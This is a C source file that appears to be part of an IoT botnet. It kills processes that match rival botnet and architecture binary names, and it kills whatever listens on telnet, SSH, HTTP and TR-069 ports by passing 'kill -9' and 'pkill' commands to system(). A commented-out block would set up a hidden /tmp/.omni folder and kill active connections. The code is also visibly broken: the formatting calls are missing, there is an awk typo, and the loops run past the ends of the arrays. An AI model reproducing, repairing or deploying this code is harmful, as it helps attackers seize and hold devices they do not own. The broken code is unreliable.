#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
char *auxf_finds[] = { "x86", "mips", "mpsl", "arm", "arm5", "arm7", "ppc", "sh4", "spc", "m68k", "dvrHelper", "sefa", "okane", "gemini", "hakai"};
char *pkill_me[] = { ".x86", ".mips", ".mpsl", ".arm", ".arm5", ".arm7", ".ppc", ".sh4", ".spc", ".m68k", "dvrHelper", "sefa." "okane.", "gemini.", "hakai."};
char *ports_drop[] = {"23", "2323", "22", "2222", "80", "8080", "48101", "7547", "5984", "1991", "1338", "1982", "2048", "443", "4321", "6667", "6697", "53413", "1337", "52869", "37215", "666"};
char *ports_drop_priority[] = {"80", "8080"};

void auxf_kill()
{
    printf("gona find aux");
    int j = 0;
    char auxf_command[248];

    for(j = 0; j < 11; j++)
    {
        (auxf_command, "ps auxf | grep \"%s\" | awk '{print 2$}' | xargs kill -9", auxf_finds[j]);
        //sleep(1);
        system(auxf_command);
    }
}

void pkill_kill()
{
    printf("gona pkill ");
    int x = 0;
    char pkill_command[248];

    for(x = 0; x < 5; x++)
    {
        (pkill_command, "pkill -9 %s", pkill_me[x]);
        //sleep(1);
        system(pkill_command);
    }
}

void port_drop_priority()
{
    printf("gona find and kill ports");
    int c = 0;
    char port_command_priority[248];

    for(c = 0; c < 9; c++)
    {
        (port_command_priority, "kill -9 $(lsof -i:%s | awk '{print $2}')", ports_drop_priority[c]);
        //sleep(1);
        system(port_command_priority);
        //sleep(5);
    }
}



void port_drop()
{
    printf("gona find and kill ports");
    int c = 0;
    char port_command[248];

    for(c = 0; c < 9; c++)
    {
        (port_command, "kill -9 $(lsof -i:%s | awk '{print $2}')", ports_drop[c]);
        //sleep(1);
        system(port_command);
    }
}

void prep_device()
{
    

    /*system("mkdir /tmp/.omni/");
    //sleep(1);
    system("kill -9 `lsof -t /tmp`");
    sleep(5);
    system("kill -9 `lsof -t /root`");
    *///sleep(5);
    //system("kill -9 `netstat -p -t | grep \"ESTABLISHED\" | grep -v \"ESTABLISHED -\" | awk {'print $7}' | awk -F '/' {'print $1'}`");
}

int main(void)
{
    sleep(1);
    prep_device();
}
